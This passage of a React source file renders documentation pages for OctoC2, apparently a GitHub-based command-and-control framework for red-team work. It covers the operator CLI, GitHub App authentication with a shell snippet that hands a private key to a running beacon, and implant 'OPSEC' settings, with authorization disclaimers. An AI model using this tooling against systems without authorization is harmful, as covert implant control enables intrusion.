        </div>
        <div style={{ color: '#9ca3af', fontSize: '0.82rem', lineHeight: 1.5 }}>
          OctoC2 is a research tool. Obtain written authorization before any engagement.
          Unauthorized access to computer systems is a criminal offense in most jurisdictions.
          The authors accept no liability for misuse.
        </div>
      </div>
    </section>
  )
}

function CliSection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="cli" label="section 06" title="octoctl CLI" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        All operator actions — tasking beacons, reading results, managing keypairs, and bootstrapping
        App auth — go through the <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.8rem' }}>octoctl</code> CLI.
        Run from the <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.8rem' }}>octoctl/</code> directory with <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.8rem' }}>bun run src/index.ts &lt;command&gt;</code>.
      </p>

      <div
        style={{
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        <div style={{ overflowX: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>Command</th>
                <th>Description</th>
              </tr>
            </thead>
            <tbody>
              {CLI_COMMANDS.map((c) => (
                <tr key={c.cmd}>
                  <td>
                    <code
                      style={{
                        background: 'rgba(0,240,255,0.06)',
                        color: '#7dd3fc',
                        padding: '2px 6px',
                        borderRadius: '3px',
                        fontSize: '0.75rem',
                        whiteSpace: 'nowrap',
                      }}
                    >
                      {c.cmd}
                    </code>
                  </td>
                  <td style={{ color: '#6b7280', fontSize: '0.78rem' }}>{c.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div
        style={{
          marginTop: '1.25rem',
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderLeft: '3px solid #00f0ff',
          borderRadius: '4px',
          padding: '0.75rem 1.25rem',
        }}
      >
        <span style={{ color: '#6b7280', fontSize: '0.8rem' }}>
          Full CLI reference and flag docs are in{' '}
          <code style={{ color: '#7dd3fc', background: 'rgba(0,240,255,0.06)', padding: '1px 5px', borderRadius: '3px', fontSize: '0.78rem' }}>docs/</code>.
        </span>
      </div>
    </section>
  )
}

function AppAuthSection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="appauth" label="section 07" title="GitHub App Authentication" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        In production, replace PATs with a GitHub App. Installation tokens expire hourly and are
        scoped to a single repository — a captured token is worthless within the hour.
      </p>

      <div
        style={{
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
          marginBottom: '2rem',
        }}
        className="border-glow-blue"
      >
        <div style={{ overflowX: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>Property</th>
                <th>Classic PAT</th>
                <th style={{ color: '#00f0ff' }}>GitHub App</th>
              </tr>
            </thead>
            <tbody>
              {APP_AUTH_COMPARISON.map((row) => (
                <tr key={row.prop}>
                  <td style={{ color: '#e2e8f0', fontWeight: 500, fontSize: '0.82rem' }}>{row.prop}</td>
                  <td style={{ color: '#6b7280', fontSize: '0.78rem' }}>{row.pat}</td>
                  <td style={{ color: '#00f0ff', fontSize: '0.78rem', fontWeight: 500 }}>{row.app}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <div
        style={{
          background: '#050508',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        <div
          style={{
            background: '#0f0f1a',
            borderBottom: '1px solid #1a1a2e',
            padding: '0.5rem 1rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem',
          }}
        >
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#ff0033', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#f59e0b', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#00f0ff', display: 'inline-block', opacity: 0.8 }} />
          <span style={{ color: '#4b5563', fontSize: '0.72rem', marginLeft: '0.5rem', letterSpacing: '0.06em' }}>
            GitHub App setup
          </span>
        </div>
        <pre
          style={{
            margin: 0,
            border: 'none',
            borderLeft: 'none',
            background: 'transparent',
            padding: '1.25rem',
            fontSize: '0.82rem',
          }}
        >{`# 1. Create a GitHub App (Settings → Developer settings → GitHub Apps)
#    Permissions: Issues (Read & write), Variables (Read)
#    Webhook: disabled

# 2. Generate a private key and save it
mv ~/Downloads/infra-monitor.*.pem ~/.config/octoc2/app-key.pem

# 3. Install the App on your C2 repo. Note the installation ID from:
#    https://github.com/settings/installations/NNNNNN

# 4. Dead-drop the key to a running beacon
cd octoctl
bun run src/index.ts drop create --beacon <id> \\
  --app-key-file ~/.config/octoc2/app-key.pem \\
  --app-id <APP_ID> --installation-id <INSTALL_ID>`}
        </pre>
      </div>
    </section>
  )
}

function EnvVarsSection() {
  return (
    <section style={{ borderBottom: '1px solid #1a1a2e', paddingBottom: '4rem' }}>
      <SectionHeader id="envvars" label="section 08" title="OPSEC Configuration" />

      <p style={{ color: '#9ca3af', fontSize: '0.9rem', lineHeight: 1.7, marginBottom: '2rem', maxWidth: '72ch' }}>
        Fine-tune beacon behavior and operational security via environment variables. These apply to the implant process.
      </p>

      <div
        style={{
          background: '#0f0f1a',
          border: '1px solid #1a1a2e',
          borderRadius: '6px',
          overflow: 'hidden',
        }}
        className="border-glow-blue"
      >
        <div style={{ overflowX: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>Variable</th>
                <th style={{ width: '7rem' }}>Default</th>
                <th>Description</th>
              </tr>
            </thead>
            <tbody>
              {ENV_VARS.map((v) => (
                <tr key={v.name}>
                  <td>
                    <code
                      style={{
                        background: 'rgba(0,240,255,0.06)',
                        color: '#7dd3fc',
                        padding: '2px 6px',
                        borderRadius: '3px',
                        fontSize: '0.75rem',
                        whiteSpace: 'nowrap',
                      }}
                    >
                      {v.name}
                    </code>
                  </td>
                  <td>
                    <code
                      style={{
                        background: 'rgba(255,255,255,0.04)',
                        color: '#9ca3af',
                        padding: '2px 6px',
                        borderRadius: '3px',
                        fontSize: '0.75rem',
                      }}
                    >
                      {v.default}
                    </code>
                  </td>
                  <td style={{ color: '#6b7280', fontSize: '0.78rem' }}>{v.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </section>
  )
}

function Footer() {
  return (
    <footer
      style={{
        borderTop: '1px solid #1a1a2e',
        padding: '2rem 0',
        textAlign: 'center',
        color: '#374151',
        fontSize: '0.78rem',
        letterSpacing: '0.05em',
      }}
    >
      <div style={{ marginBottom: '0.4rem', color: '#4b5563' }}>
        OctoC2 — GitHub-Native C2 Framework for authorized red-team operations
      </div>
      <div style={{ marginBottom: '0.4rem' }}>
        <a href="https://github.com/dstours/OctoC2" style={{ color: '#4b5563', textDecoration: 'none' }}>
          github.com/dstours/OctoC2
        </a>
      </div>
      <div>
        For security research and authorized penetration testing only.
      </div>
    </footer>
  )
}

// ─── App ─────────────────────────────────────────────────────────────────────

export default function App() {
  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#0a0a0f' }}>
      <Navbar />
      <main style={{ maxWidth: '1100px', margin: '0 auto', padding: '0 1.5rem' }}>
        <HeroSection />
        <ArchitectureSection />
        <QuickStartSection />
        <DashboardSection />
        <E2ESection />
        <CliSection />
        <AppAuthSection />
        <EnvVarsSection />
        <OpsecSection />
      </main>
      <div style={{ maxWidth: '1100px', margin: '0 auto', padding: '0 1.5rem' }}>
        <Footer />
      </div>
    </div>
  )
}
